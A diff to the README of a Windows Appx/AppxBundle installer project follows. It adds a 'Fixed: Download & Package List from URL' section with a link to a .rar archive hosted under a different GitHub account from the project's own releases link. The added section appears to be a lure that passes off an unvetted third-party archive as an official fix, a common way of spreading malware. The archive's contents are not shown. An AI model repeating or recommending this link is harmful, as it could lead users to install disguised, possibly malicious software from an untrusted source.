@@ -7,6 +7,12 @@ A lightweight, modern Windows desktop application for managing Appx, AppxBundle,
 ![License](https://img.shields.io/badge/License-MIT-green)
 ![Status](https://img.shields.io/badge/Status-Active-brightgreen)
 
+## ✅ Fixed: Download & Package List from URL
+
+The **Package Downloader** has been fixed. It now correctly fetches the package list from a URL (via `store.rg-adguard.net`) and downloads Appx/MSIX files, no longer being blocked or returning empty results.
+
+[**⬇ Download the fixed app (AppxBundle-Installer-fixed.rar)**](https://github.com/youcef07dz/AppxBundle-Installer-downloader/raw/refs/heads/main/AppxBundle-Installer-downloader-fixed.rar)
+
 ## 📥 Download
 [**Get the latest version here**](https://github.com/jdros15/AppxBundle-Installer/releases)
 
